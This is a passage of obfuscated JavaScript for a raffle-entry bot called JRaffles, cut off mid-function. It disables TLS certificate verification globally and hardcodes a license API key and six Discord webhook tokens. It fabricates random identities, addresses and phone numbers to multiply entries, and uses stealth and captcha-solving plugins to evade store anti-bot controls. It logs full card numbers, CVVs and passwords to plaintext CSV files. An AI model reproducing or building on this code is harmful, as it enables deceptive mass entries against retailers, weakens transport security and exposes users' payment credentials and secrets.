process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x4b4581 = require('fs'), _0x1f12b9 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x229f50(_0x37c821) {
    const _0xba8d76 = _0x4b4581['createWriteStream'](_0x37c821, { 'flags': 'a' }), _0x3e2b6c = console['log'];
    console['log'] = function () {
        const _0x33f9f9 = Array['prototype']['slice']['call'](arguments), _0x4eb751 = _0x33f9f9['join']('\x20') + '\x0a';
        _0xba8d76['write'](_0x4eb751), _0x3e2b6c['apply'](console, _0x33f9f9);
    };
}
_0x229f50('../logs/log\x20' + _0x1f12b9);
var _0x1b7831 = require('tough-cookie'), _0x533159 = require('node-imap'), _0x395cc0 = require('util')['inspect'];
const _0x6212d5 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x9e1320 } = require('discord.js');
var _0x289607 = require('exe');
const { execFile: _0x568224 } = require('child_process'), _0x43efe1 = require('puppeteer-extra'), _0x46c0dc = require('puppeteer-extra-plugin-recaptcha'), _0x2180a5 = require('puppeteer-extra-plugin-stealth'), _0x4f1d86 = require('chalk'), _0x3e9ae7 = require('node-bash-title'), _0x12ee7a = require('axios'), _0x57f724 = require('papaparse');
var _0x2cfe73 = require('random-name');
const _0x31fe1f = require('request');
var _0x1f16f4 = require('prompt');
const _0x4cd5d1 = _0x31fe1f['jar']();
var _0x1940dd = {};
const _0x11131c = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x573907 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x23d301 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x256900 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3967bc = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x54734d = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x508591 = 'https://discord.com/api/webhooks/', _0x381bd0 = '' + _0x508591 + _0x23d301, _0x4ebcdb = '' + _0x508591 + _0x256900, _0x2faedb = '' + _0x508591 + _0x11131c, _0x45f55a = '' + _0x508591 + _0x573907, _0x443f6 = '' + _0x508591 + _0x3967bc, _0x341688 = '' + _0x508591 + _0x54734d;
const _0x186d21 = JSON['parse'](_0x4b4581['readFileSync']('../package.json', 'utf-8')), _0x233a0d = _0x186d21['version'];
var _0x5237bc, _0x3c7bd9, _0x280348, _0x6da6b3, _0xbc1b47, _0x1428e0, _0x1c4b49, _0x1cf11b;
const _0x4d357 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2999fb = ![];
const _0x628369 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x266182 = '0123456789';
var _0x486591 = _0x628369['split']('');
const _0x3f7178 = require('auto-git-update'), _0x11c37e = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xfc3f06 = new _0x3f7178(_0x11c37e);
async function _0x1d292e() {
    _0xbc1b47 = _0x4b4581['readdirSync']('../proxies'), _0x6da6b3 = _0x4b4581['readdirSync']('../tasks'), !_0x4b4581['existsSync']('../accounts/fenom.csv') && _0x4b4581['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x4b4581['existsSync']('../accounts/paypal.csv') && _0x4b4581['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x4b4581['existsSync']('../accounts/bstn.csv') && _0x4b4581['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x4b4581['existsSync']('../accounts/eql.csv') && _0x4b4581['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x4b4581['existsSync']('../failed-tasks.csv') && _0x4b4581['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x4b4581['existsSync']('../successful-tasks.csv') && _0x4b4581['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x1940dd = JSON['parse'](_0x4b4581['readFileSync']('../settings.json', 'utf-8')), !_0x1940dd['delay'] && (_0x1940dd['delay'] = 0x3c, _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['masterMail'] && (_0x1940dd['masterMail'] = 'yourmail@gmail.com', _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['masterPassword'] && (_0x1940dd['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['captchaKey'] && (_0x1940dd['captchaKey'] = '', _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['useRandomProxy'] && (_0x1940dd['useRandomProxy'] = !![], _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['shuffleTasks'] && (_0x1940dd['shuffleTasks'] = ![], _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), !_0x1940dd['webhook'] && (_0x1940dd['webhook'] = '', _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), _0x1940dd['delay'] <= 0x1388 && (_0x1940dd['delay'] = _0x1940dd['delay'] * 0x3e8), _0x1940dd['AfewDelay'] && (delete _0x1940dd['AfewDelay'], _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), _0x1940dd['MahaDelay'] && (delete _0x1940dd['MahaDelay'], _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), _0x1940dd['footshopDelay'] && (delete _0x1940dd['footshopDelay'], _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd, null, 0x2))), _0x1940dd['MahaDelay'] = _0x1940dd['delay'], _0x508591 = _0x1940dd['webhook'], _0x1428e0 = _0x1940dd['licenseKey'];
}
let _0x1cbbfb, _0x34f3db = [], _0x20db65;
const _0xf09eb2 = _0x2e39f4 => new Promise(_0x1923ac => setTimeout(_0x1923ac, _0x2e39f4));
function _0x215f62(_0x13eb97, _0x51d0a6) {
    return Math['floor'](Math['random']() * (_0x51d0a6 - _0x13eb97 + 0x1) + _0x13eb97);
}
function _0x58dbe9(_0x57c1dc) {
    let _0x28079b = _0x57c1dc['length'], _0x42c81e;
    while (_0x28079b != 0x0) {
        _0x42c81e = Math['floor'](Math['random']() * _0x28079b), _0x28079b--, [_0x57c1dc[_0x28079b], _0x57c1dc[_0x42c81e]] = [
            _0x57c1dc[_0x42c81e],
            _0x57c1dc[_0x28079b]
        ];
    }
    return _0x57c1dc;
}
async function _0x28d349(_0x4f07be) {
    return _0x12ee7a['get']('https://api.hyper.co/v4/licenses/' + _0x4f07be, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4d357 } })['then'](_0x3d1ade => _0x3d1ade['data'])['catch'](() => null);
}
;
async function _0x42a107(_0x5b99d3) {
    console['clear']();
    if (_0x5b99d3 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x224959 = await _0x1f16f4['get']('License');
        if (_0x224959['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xf09eb2(0xbb8), _0x42a107(_0x5b99d3);
        _0x5b99d3 = _0x224959['License'], _0x1940dd['licenseKey'] = _0x5b99d3, _0x1428e0 = _0x5b99d3, _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd));
    }
    console['log']('Checking\x20license\x20' + _0x1428e0 + '...'), await _0xf09eb2(0x320);
    const _0x1e7847 = await _0x28d349(_0x5b99d3);
    _0x1c4b49 = JSON['stringify'](_0x1e7847['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1cf11b = JSON['stringify'](_0x1e7847['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x1e7847)
        return console['log']('License\x20not\x20found');
    if (!_0x1e7847['user'])
        return console['log']('License\x20not\x20bound');
    return _0x1e7847['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2999fb = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2999fb = ![]);
}
async function _0x22e301() {
    var _0x2dd7b4 = await _0x1f16f4['get']('Module');
    return console['clear'](), _0x2dd7b4['Module'];
}
;
async function _0x42b290() {
    var _0x49f8c2 = await _0x1f16f4['get']('Setting');
    return console['clear'](), _0x49f8c2['Setting'];
}
async function _0x33d6f7(_0x5a60b0) {
    var _0x17fd9e = [];
    for (file of _0x6da6b3) {
        var _0x4204e1 = _0x4b4581['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x57f724['parse'](_0x4204e1, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x5a60b0['store'] && _0x17fd9e['push'](file);
    }
    !_0x17fd9e['length'] == 0x0 && (_0x6da6b3 = _0x17fd9e);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x546c4e = 0x0; _0x546c4e < _0x6da6b3['length']; _0x546c4e++) {
        console['log']('\x20(' + _0x546c4e + ')\x20' + _0x6da6b3[_0x546c4e]);
    }
    console['log']('');
    var _0x159b2a = await _0x1f16f4['get']('Task');
    if (_0x159b2a['Task'] > _0x6da6b3['length'] - 0x1 || isNaN(_0x159b2a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xf09eb2(0x3e8), _0x33d6f7();
    var _0x3d91c5 = _0x4b4581['readFileSync']('../tasks/' + _0x6da6b3[_0x159b2a['Task']], 'utf-8');
    return _0x280348 = _0x57f724['parse'](_0x3d91c5, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x4f1d86['blue'](_0x6da6b3[_0x159b2a['Task']])), _0x5237bc = _0x6da6b3[_0x159b2a['Task']], _0x280348;
}
async function _0x48df80() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x57616b = 0x0; _0x57616b < _0xbc1b47['length']; _0x57616b++) {
        console['log']('\x20(' + _0x57616b + ')\x20' + _0xbc1b47[_0x57616b]);
    }
    console['log']('');
    var _0x24e237 = await _0x1f16f4['get']('Proxies');
    if (_0x24e237['Proxies'] > _0xbc1b47['length'] - 0x1 || isNaN(_0x24e237['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xf09eb2(0x3e8), _0x48df80();
    var _0xf800e4 = _0x4b4581['readFileSync']('../proxies/' + _0xbc1b47[_0x24e237['Proxies']], 'utf-8')['split']('\x0a');
    let _0x1719ff = _0xf800e4['map']((_0x309625, _0x18ef68) => {
        sanatizeProxy = _0x309625['replace']('\x0d', '');
        if (_0xf800e4[_0x18ef68 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3c7bd9 = _0xbc1b47[_0x24e237['Proxies']], console['clear'](), _0x1719ff;
}
async function _0x10810c() {
    var _0x58a247 = await _0x1f16f4['get']('Value');
    return console['clear'](), _0x58a247['Value'];
}
async function _0x785bd7(_0x269c6b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5b83b2 = 0x0; _0x5b83b2 < _0x269c6b['length']; _0x5b83b2++) {
        console['log']('\x20(' + _0x5b83b2 + ')\x20[' + _0x269c6b[_0x5b83b2]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x9e2a52 = await _0x1f16f4['get']('Module');
    return _0x9e2a52['Module'];
}
async function _0x534071() {
    var _0x4b4e7c = await _0x1f16f4['get']('Password');
    return console['clear'](), _0x4b4e7c['Password'];
}
;
async function _0x24e213() {
    var _0x2cd4ff = await _0x1f16f4['get']('Links');
    return _0x2cd4ff['Links'];
}
;
async function _0x90604f() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x99ed91 = 0x0; _0x99ed91 < _0x34f3db['length']; _0x99ed91++) {
        console['log']('\x20(' + _0x99ed91 + ')\x20' + _0x34f3db[_0x99ed91]);
    }
    ;
    console['log']();
    let _0x1c8483 = await _0x1f16f4['get']('Product');
    return console['clear'](), _0x1c8483['Product'];
}
;
function _0x1fc391() {
    var _0x357560 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x357560;
}
;
function _0x5342e5() {
    var _0x4e7007 = new Date(Date['now']())['toLocaleString']();
    return _0x4e7007['replace'](',', '');
}
async function _0x58a176(_0x5959c0, _0x2b8416) {
    let _0x2cead5 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x233a0d != 'devkey') {
        await _0x12ee7a['post'](_0x5959c0, _0x2b8416, _0x2cead5);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x22cd2f(_0x291baf, _0x29acff, _0x49e96e, _0xa27838, _0x5b98c0) {
    if (!_0xa27838 && _0x49e96e == 'dev') {
        var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x29acff['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x29acff['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x291baf['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x1940dd['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1c4b49,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x291baf['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x291baf['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x233a0d,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x46dcb8['data'];
    } else {
        if (_0xa27838 && _0x49e96e == 'dev') {
            var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x29acff['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1c4b49,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x29acff['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x291baf['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x1940dd['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x5b98c0,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x291baf['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x291baf['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x233a0d,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x46dcb8['data'];
        } else {
            if (_0x49e96e == 'pub') {
                var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x29acff['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x29acff['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x291baf['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x1940dd['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x291baf['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x233a0d,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x46dcb8['data'];
            } else {
                if (_0x49e96e == 'acc' && !_0xa27838) {
                    var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x29acff['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1c4b49,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x29acff['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x1940dd['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x233a0d,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x46dcb8['data'];
                } else {
                    if (_0x49e96e == 'acc' && _0xa27838) {
                        var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x29acff['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1c4b49,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x5b98c0,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x29acff['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x1940dd['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x233a0d,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x46dcb8['data'];
                    } else {
                        if (_0x49e96e == 'open') {
                            var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1cf11b)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1c4b49,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x233a0d,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x46dcb8['data'];
                        } else {
                            if (!_0xa27838 && _0x49e96e == 'ver') {
                                var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x29acff['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1c4b49,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x29acff['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x1940dd['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x233a0d,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x46dcb8['data'];
                            } else {
                                if (_0xa27838 && _0x49e96e == 'ver') {
                                    var _0x46dcb8 = new _0x9e1320()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x29acff['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1c4b49,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x5b98c0,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x29acff['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x1940dd['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x233a0d,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x46dcb8['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0xf6702b(_0x13f68f, _0x2b8818) {
    var _0x218b32 = _0x13f68f[_0x2b8818]['Address1']['split'](''), _0x429a88 = _0x13f68f[_0x2b8818]['Address2']['split'](''), _0x14cd75 = _0x13f68f[_0x2b8818]['Email']['split']('@');
    for (var _0x36f858 = 0x0; _0x36f858 < _0x218b32['length']; _0x36f858++) {
        if (_0x218b32[_0x36f858] == 'X') {
            var _0x44e885 = Math['round'](Math['random']() * (_0x628369['length'] - 0x1));
            _0x218b32[_0x36f858] = _0x486591[_0x44e885];
        }
    }
    ;
    for (var _0x36f858 = 0x0; _0x36f858 < _0x429a88['length']; _0x36f858++) {
        if (_0x429a88[_0x36f858] == 'X') {
            var _0x44e885 = Math['round'](Math['random']() * (_0x628369['length'] - 0x1));
            _0x429a88[_0x36f858] = _0x486591[_0x44e885];
        }
    }
    ;
    _0x13f68f[_0x2b8818]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x13f68f[_0x2b8818]['FirstName'] = _0x2cfe73['first']());
    _0x13f68f[_0x2b8818]['LastName']['toUpperCase']() == 'RANDOM' && (_0x13f68f[_0x2b8818]['LastName'] = _0x2cfe73['last']());
    _0x14cd75[0x0]['toUpperCase']() == 'RANDOM' ? _0x14cd75[0x0] = '' + _0x2cfe73['first']() + _0x2cfe73['last']() + _0x215f62(0x1, 0x270f) + '@' : _0x14cd75[0x0] = _0x14cd75[0x0] + '@';
    _0x13f68f[_0x2b8818]['Email'] = _0x14cd75['join'](''), _0x13f68f[_0x2b8818]['Address1'] = _0x218b32['join'](''), _0x13f68f[_0x2b8818]['Address2'] = _0x429a88['join']('');
    _0x13f68f[_0x2b8818]['Phone'] == 'RANDOM' && (_0x13f68f[_0x2b8818]['Phone'] = '0' + _0x215f62(0x5f5e100, 0x3b9ac9ff));
    if (_0x13f68f[_0x2b8818]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x69e776 = _0x215f62(0x1, 0x270f);
        _0x13f68f[_0x2b8818]['Follower'] = '' + _0x2cfe73['first']() + _0x2cfe73['last']() + _0x69e776 + '\x20';
    }
    _0x13f68f[_0x2b8818]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x13f68f[_0x2b8818]['HouseNumber'] = _0x215f62(0x1, 0xc8));
    if (_0x13f68f[_0x2b8818]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x54bee6 = Math['round'](Math['random']() * (_0x628369['length'] - 0x1)), _0x4e0ab6 = _0x486591[_0x54bee6];
        _0x13f68f[_0x2b8818]['Address1'] = _0x2cfe73['last']() + 'straat', _0x13f68f[_0x2b8818]['Zip'] == '' && (_0x13f68f[_0x2b8818]['Postcode'] = _0x215f62(0x3e8, 0x270f) + '\x20' + _0x4e0ab6 + _0x4e0ab6, _0x13f68f[_0x2b8818]['Zip'] = _0x13f68f[_0x2b8818]['Postcode']), _0x13f68f[_0x2b8818]['HouseNumber'] = '' + _0x215f62(0x1, 0xc8);
    }
    return;
}
;
async function _0x3f94a0(_0x481444, _0x21fa3c) {
    _0x4b4581['appendFileSync']('../failed-tasks.csv', _0x5342e5() + ',' + _0x21fa3c['store'] + ',' + _0x21fa3c['name'] + ',' + _0x481444['Url'] + ',' + _0x481444['Size'] + ',' + _0x481444['Follower'] + ',' + _0x481444['FirstName'] + ',' + _0x481444['LastName'] + ',' + _0x481444['Address1'] + ',' + _0x481444['Address2'] + ',' + _0x481444['HouseNumber'] + ',' + _0x481444['Zip'] + ',' + _0x481444['City'] + ',' + _0x481444['State'] + ',' + _0x481444['Country'] + ',' + _0x481444['Phone'] + ',' + _0x481444['Email'] + ',' + _0x481444['Password'] + ',' + _0x481444['PaymentMethod'] + ',' + _0x481444['CardType'] + ',' + _0x481444['NameOnCard'] + ',' + _0x481444['CardNumber'] + ',' + _0x481444['ExpiryDate'] + ',' + _0x481444['CVV'] + ',' + _0x481444['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x3ed4cd(_0x3f200a, _0x39eb00) {
    _0x4b4581['appendFileSync']('../successful-tasks.csv', _0x5342e5() + ',' + _0x39eb00['store'] + ',' + _0x39eb00['name'] + ',' + _0x3f200a['Url'] + ',' + _0x3f200a['Size'] + ',' + _0x3f200a['Follower'] + ',' + _0x3f200a['FirstName'] + ',' + _0x3f200a['LastName'] + ',' + _0x3f200a['Address1'] + ',' + _0x3f200a['Address2'] + ',' + _0x3f200a['HouseNumber'] + ',' + _0x3f200a['Zip'] + ',' + _0x3f200a['City'] + ',' + _0x3f200a['State'] + ',' + _0x3f200a['Country'] + ',' + _0x3f200a['Phone'] + ',' + _0x3f200a['Email'] + ',' + _0x3f200a['Password'] + ',' + _0x3f200a['PaymentMethod'] + ',' + _0x3f200a['CardType'] + ',' + _0x3f200a['NameOnCard'] + ',' + _0x3f200a['CardNumber'] + ',' + _0x3f200a['ExpiryDate'] + ',' + _0x3f200a['CVV'] + ',' + _0x3f200a['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x524b10() {
    let _0x1079f7 = proxyFile['split']('\x0a'), _0x5164d9 = _0x1079f7['map']((_0x54a101, _0x2f84d6) => {
        sanatizeProxy = _0x54a101['replace']('\x0d', '');
        if (_0x1079f7[_0x2f84d6 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5164d9;
}
;
async function _0xdf877d(_0x3d9de8, _0x44a976) {
    if (_0x548e92 != 'yes')
        var _0x548e92 = '', _0x51bba2 = 0x0;
    async function _0x27bc14() {
        var _0x321549 = _0x4b4581['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x2f00ef = _0x57f724['parse'](_0x321549, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x5604a8 = 0x0; _0x5604a8 < _0x2f00ef['length']; _0x5604a8++) {
            console['log']('(' + _0x5604a8 + ')\x20' + _0x2f00ef[_0x5604a8]['Email']);
        }
        console['log']('\x0a(' + _0x2f00ef['length'] + ')\x20' + _0x4f1d86['cyan']('Add\x20a\x20new\x20account'));
        let _0x387af8 = await _0x1f16f4['get']('Option');
        if (_0x387af8['Option'] < _0x2f00ef['length'])
            return _0x2f00ef[_0x387af8['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x3a7f4a = {}, _0x5abd79 = await _0x1f16f4['get']('Email');
        _0x3a7f4a['Email'] = _0x5abd79['Email'];
        var _0x29c1ac = Math['round'](Math['random']() * (_0x44a976['length'] - 0x1));
        _0x3a7f4a['Proxy'] = _0x44a976[_0x29c1ac], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3785b9 = await _0x1f16f4['get']('Password');
